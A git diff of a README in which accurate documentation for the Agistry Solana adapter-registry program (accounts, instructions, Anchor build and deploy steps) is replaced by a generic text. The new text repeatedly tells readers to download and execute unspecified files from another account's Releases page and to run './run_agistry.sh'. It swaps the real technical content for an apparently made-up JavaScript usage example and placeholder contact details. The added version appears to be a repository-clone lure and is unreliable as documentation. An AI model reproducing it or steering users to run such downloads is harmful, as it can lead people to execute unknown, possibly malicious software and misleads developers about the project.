@@ -1,124 +1,135 @@
-# Agistry - Decentralized Adapter Registry for AI Agents (Solana Program)
+# Agistry Framework v1 🌐
 
-![banner](./assets/banner.png)
+![Agistry Framework](https://img.shields.io/badge/Agistry_Framework-v1-blue?style=for-the-badge)
 
-Agistry is a decentralized registry built on the Solana blockchain that allows AI agents to discover and interface with off-chain tools and APIs in a standardized and trustworthy manner. This repository contains the core Solana smart contract (program) for the Agistry registry.
+Welcome to the **Agistry Framework v1** repository! This project provides a decentralized adapter registry designed for seamless interfacing between AI agents and various tools. 
 
-**Problem Agistry Solves:**
-Most AI agents in Web3 still rely on custom-built, insecure adapters to call off-chain services. This leads to:
+## Table of Contents
 
-- No standards for interfacing.
-- No proofs of data integrity or execution.
-- No composability between agents and tools.
-- Fragile, messy, and unscalable integrations.
+- [Introduction](#introduction)
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-**Agistry's Solution:**
+## Introduction
 
-- A **decentralized adapter registry** where developers can publish metadata about their tools/APIs.
-- **Standardizing access** to these off-chain services through a defined Adapter Interface Specification (AIS), typically using OpenAPI.
-- (Future) Enabling **proofs** for verifiable off-chain interactions.
-- Promoting **composability** and scalability for AI agent-tool ecosystems.
+In the rapidly evolving world of artificial intelligence, the ability for agents to communicate effectively with tools is crucial. The Agistry Framework v1 addresses this need by offering a robust and decentralized registry for adapters. This allows AI agents to easily access and utilize various tools, enhancing their functionality and adaptability.
 
-![process_flow](./assets/process_flow.png)
+## Features
 
-## Features of the Solana Program
+- **Decentralized Registry**: Ensures that all adapters are accessible without a central authority.
+- **Flexible Interfacing**: Supports multiple tools and protocols, making it easy for AI agents to interact.
+- **Scalable Architecture**: Designed to grow with your needs, accommodating more agents and tools as required.
+- **User-Friendly**: Simplifies the integration process for developers and AI practitioners.
 
-- **Registry Initialization:** Securely set up the registry with an admin, initial schema version, and optional registration fees.
-- **Adapter Registration:** Developers can register their adapters, providing an immutable metadata hash (e.g., IPFS CID) pointing to detailed off-chain information (like an OpenAPI spec).
-- **Adapter Management:**
-  - Update metadata hash for an adapter.
-  - Deprecate adapters that are no longer active.
-  - Transfer ownership of an adapter registration.
-- **Fee Mechanism (Optional):** Configure a registration fee in SOL, payable to a designated recipient.
-- **Pause Functionality:** The admin can pause new registrations or modifications during maintenance or emergencies.
-- **Event-Driven:** Emits detailed events for all significant actions, enabling off-chain indexers to build rich query capabilities (e.g., find adapters by owner, tag, etc.).
-- **Built with Anchor:** Leverages the Anchor framework for safer and more efficient Solana program development.
+## Getting Started
 
-## Core Concepts
+To get started with the Agistry Framework v1, follow these steps:
 
-- **Registry Configuration (`RegistryConfig` PDA):** A singleton Program Derived Address (PDA) that stores global settings like the admin, current adapter counter, metadata schema version, fee details, and pause status.
-- **Adapter Account (`AdapterAccount` PDA):** Each registered adapter has its own PDA, uniquely identified by an auto-incrementing ID. It stores the adapter's owner, the metadata hash, status (Active/Deprecated), timestamps, and its PDA bump.
-- **Adapter Metadata:** Rich details about an adapter (name, description, OpenAPI spec URL, security requirements, tags, etc.) are stored **off-chain** (e.g., on IPFS or Arweave). The on-chain `AdapterAccount` only stores a hash (e.g., IPFS CID) pointing to this off-chain data. This keeps on-chain storage costs low.
-- **Adapter Interface Specification (AIS):** (Defined externally) A specification (e.g., based on OpenAPI) that all registered adapters should adhere to for how AI agents interact with them.
-- **Events:** The program emits events for actions like `AdapterRegistered`, `AdapterMetadataUpdated`, etc. These are crucial for off-chain services to build indexes and provide query capabilities that are not feasible or cost-effective to implement directly on-chain (e.g., "list all adapters owned by X").
-
-## Program Structure (`programs/agistry_registry/src/lib.rs`)
-
-- **`initialize_registry`:** Sets up the global `RegistryConfig` account.
-- **`register_adapter`:** Creates a new `AdapterAccount` for a new adapter.
-- **`update_adapter_metadata`:** Allows the owner to change the `metadata_hash` of an active adapter.
-- **`deprecate_adapter`:** Allows the owner to mark an adapter as deprecated.
-- **`transfer_adapter_ownership`:** Allows the owner to transfer control of an adapter registration to a new owner.
-- **Admin Functions (`set_pause_status`, `set_metadata_schema_version`, etc.):** Allow the admin to manage the registry.
-- **Account Structs:** Define the data structures for `RegistryConfig` and `AdapterAccount`.
-- **Context Structs:** Define the accounts required for each instruction, along with their constraints (e.g., ownership checks, PDA derivations).
-- **Events & Errors:** Define custom events and error types.
-
-## Building and Deploying
-
-This program is built using the [Anchor Framework](https://www.anchor-lang.com/).
-
-1. **Prerequisites:**
-
-   - Install Rust: `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`
-   - Install Solana CLI: Refer to [Solana documentation](https://docs.solana.com/cli/install-solana-cli-tools)
-   - Install Anchor: Refer to [Anchor installation guide](https://www.anchor-lang.com/docs/installation) (e.g., `avm install latest && avm use latest`)
-   - Node.js and yarn/npm for running tests.
-
-2. **Clone the repository (if applicable):**
+1. **Clone the Repository**: Use the command below to clone the repository to your local machine.
 
    ```bash
-   git clone https://github.com/agistry-dev/agistry-framework-v1
+   git clone https://github.com/cogusp/agistry-framework-v1.git
+   ```
+
+2. **Navigate to the Directory**: Change into the project directory.
+
+   ```bash
    cd agistry-framework-v1
    ```
 
-3. **Build the program:**
+3. **Install Dependencies**: Install the necessary dependencies using your preferred package manager.
 
    ```bash
-   anchor build
+   npm install
    ```
 
-   After the first successful build, a program ID will be generated. Update the `declare_id!(<id>);` line in `programs/agistry_registry/src/lib.rs` with this new ID. Then, rebuild.
+## Installation
 
-4. **Run Tests (Example):**
-   (You'll need to write tests in the `tests/` directory, typically using TypeScript and `@coral-xyz/anchor`.)
+To install the Agistry Framework v1, follow these steps:
+
+1. **Download the Latest Release**: Visit the [Releases](https://github.com/cogusp/agistry-framework-v1/releases) section to download the latest version. If you need to execute a specific file, follow the instructions provided there.
+
+2. **Run the Framework**: After downloading, execute the necessary file to start using the framework.
 
    ```bash
-   anchor test
+   ./run_agistry.sh
    ```
 
-5. **Deploy to a localnet:**
+## Usage
 
-   - Start a local Solana validator: `solana-test-validator`
-   - Deploy: `anchor deploy --provider.cluster localhost`
+Once installed, you can start using the Agistry Framework v1. Here’s a simple example of how to create an adapter and register it:
 
-6. **Deploy to Devnet/Mainnet-Beta:**
-   - Configure Solana CLI for the desired cluster:
-     ```bash
-     solana config set --url devnet
-     # or
-     solana config set --url mainnet-beta
-     ```
-   - Ensure your wallet has enough SOL for deployment.
-   - Deploy: `anchor deploy` (it will use the currently configured cluster)
+```javascript
+const { AdapterRegistry } = require('agistry-framework');
 
-## Interacting with the Registry
+const registry = new AdapterRegistry();
 
-Clients (like the Agistry SDK or AI agents) will interact with this deployed Solana program using RPC calls.
+// Create a new adapter
+const myAdapter = {
+    name: 'MyAdapter',
+    type: 'tool',
+    connect: function() {
+        console.log('Adapter connected!');
+    }
+};
 
-- **Fetching Adapter Data:** To get adapter details, clients would typically:
-  1.  Query an **off-chain indexing service** (that listens to Agistry events) for adapters based on criteria (e.g., capability, owner). This service would return the `adapter_id` and the on-chain account address of the `AdapterAccount`.
-  2.  Fetch the `AdapterAccount` data directly from the Solana blockchain using its address to get the `metadata_hash`.
-  3.  Fetch the actual metadata (e.g., OpenAPI spec) from the decentralized storage (IPFS/Arweave) using the `metadata_hash`.
-- **Transactions:** Registering, updating, or transferring adapters involves sending transactions that call the respective instructions in this program.
+// Register the adapter
+registry.register(myAdapter);
 
-## Future Considerations
+// Use the adapter
+const adapter = registry.get('MyAdapter');
+adapter.connect();
+```
 
-- **Reputation System:** Integrating mechanisms for rating or vouching for adapters.
-- **On-chain Proof Verification:** Storing or verifying proofs related to adapter execution (this is complex and may involve other protocols or L2s).
-- **More Granular Categorization/Tagging:** While tags can be in off-chain metadata, some core on-chain categorization might be useful if simple enough.
-- **Governance:** Mechanisms for upgrading the program or changing critical parameters via a DAO.
+This code snippet demonstrates how easy it is to create and use adapters within the Agistry Framework.
+
+## Contributing
+
+We welcome contributions to the Agistry Framework v1! If you would like to contribute, please follow these steps:
+
+1. **Fork the Repository**: Click the "Fork" button at the top right of this page.
+2. **Create a New Branch**: Use the command below to create a new branch for your feature or fix.
+
+   ```bash
+   git checkout -b feature/my-feature
+   ```
+
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**: Use a clear commit message.
+
+   ```bash
+   git commit -m "Add my feature"
+   ```
+
+5. **Push to the Branch**: Push your changes to your forked repository.
+
+   ```bash
+   git push origin feature/my-feature
+   ```
+
+6. **Create a Pull Request**: Go to the original repository and click "New Pull Request".
+
+## License
+
+The Agistry Framework v1 is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or feedback, please contact the maintainer:
+
+- **Name**: Your Name
+- **Email**: your.email@example.com
+
+## Releases
+
+For the latest releases, please visit the [Releases](https://github.com/cogusp/agistry-framework-v1/releases) section. Here, you can download the latest version and execute the necessary files to get started with the Agistry Framework v1.
 
 ---
 
-This README provides a high-level overview. For detailed program logic, refer to the source code in `programs/agistry_registry/src/lib.rs`.
+Thank you for your interest in the Agistry Framework v1! We look forward to seeing how you use this tool in your projects. Happy coding!
